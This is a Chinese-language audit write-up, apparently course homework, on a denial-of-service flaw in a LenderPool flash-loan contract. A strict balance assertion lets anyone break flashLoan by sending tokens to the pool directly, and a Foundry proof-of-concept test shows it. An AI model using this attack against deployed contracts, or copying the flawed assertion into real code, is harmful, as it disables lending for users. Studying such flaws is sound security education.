# 攻擊者轉帳給 pool 造成 DOS

# Lines of code

https://github.com/z-institute/Web3-Security-Dev-Batch-1-HW/blob/main/w3/src/LenderPool.sol#L31-L46

https://github.com/z-institute/Web3-Security-Dev-Batch-1-HW/blob/main/w3/src/LenderPool.sol#L24-L29

# Vulnerability details

function flashLoan 裡，poolBalance 必須等於 balanceBefore，function 才會繼續執行:

```
function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = amazingToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // Ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore);

    amazingToken.transfer(msg.sender, borrowAmount);

    IReceiver(msg.sender).receiveTokens(address(amazingToken), borrowAmount);

    uint256 balanceAfter = amazingToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

但只有在 function depositTokens 被調用時，poolBalance 才會更新數值：

```
function depositTokens(uint256 amount) external nonReentrant {
    require(amount > 0, "Must deposit at least one token");
    // Transfer token from sender. Sender must have first approved them.
    amazingToken.transferFrom(msg.sender, address(this), amount);
    poolBalance = poolBalance + amount;
}
```

因此攻擊者可藉由 token.transfer(address(pool), 1)轉帳給 pool，使池中金額增加－後續調用 flashLoan function 時會更新 balanceBefore 數值，但 poolBalance 的數值沒有更新－即可讓斷言失敗，造成 function flashLoan 無法運作。

# Impact

任何人都能透過轉帳給 pool 任意金額這種方式，讓 flashLoan function 無法運作，達成 DOS 攻擊。

# PoC

以下程式碼用以驗證漏洞。

```
function testExploit() public {
    /**
        * CODE YOUR EXPLOIT HERE
        */
    vm.prank(attacker);
    token.transfer(address(pool), 1);
    /**
        * SUCCESS CONDITIONS
        */
    vm.expectRevert(stdError.assertionError);
    vm.prank(someUser);
    receiverContract.executeFlashLoan(10);
}
```
